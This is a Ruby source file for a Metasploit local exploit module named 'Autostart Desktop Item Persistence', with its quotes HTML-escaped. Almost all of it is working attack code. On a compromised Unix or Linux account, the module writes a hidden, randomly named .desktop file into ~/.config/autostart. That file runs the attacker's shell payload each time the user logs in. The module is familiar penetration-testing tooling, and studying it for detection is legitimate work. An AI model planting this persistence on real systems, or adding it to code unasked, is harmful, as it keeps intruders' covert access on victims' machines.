# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Autostart Desktop Item Persistence&#039;,
      &#039;Description&#039;    => %q(
        This module will create an autostart entry to execute a payload.
        The payload will be executed when the users logs in.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [ &#039;Eliott Teissonniere&#039; ],
      &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        => {
        &#039;BadChars&#039;   => &#039;#%\n"&#039;,
        &#039;Compat&#039;     => {
          &#039;PayloadType&#039;  => &#039;cmd&#039;,
          &#039;RequiredCmd&#039;  => &#039;generic python netcat perl&#039;
        }
      },
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 0, &#039;DisablePayloadHandler&#039; => &#039;true&#039; },
      &#039;DisclosureDate&#039; => &#039;Feb 13 2006&#039;, # Date of the 0.5 doc for autostart
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([ OptString.new(&#039;NAME&#039;, [false, &#039;Name of autostart entry&#039; ]) ])
  end

  def exploit
    name = datastore[&#039;NAME&#039;] || Rex::Text.rand_text_alpha(5)

    home = cmd_exec(&#039;echo ~&#039;)

    path = "#{home}/.config/autostart/#{name}.desktop"

    print_status(&#039;Making sure the autostart directory exists&#039;)
    cmd_exec("mkdir -p #{home}/.config/autostart") # in case no autostart exists

    print_status("Uploading autostart file #{path}")

    write_file(path, [
      "[Desktop Entry]",
      "Type=Application",
      "Name=#{name}",
      "NoDisplay=true",
      "Terminal=false",
      "Exec=/bin/sh -c \"#{payload.encoded}\""
    ].join("\n"))
  end
end

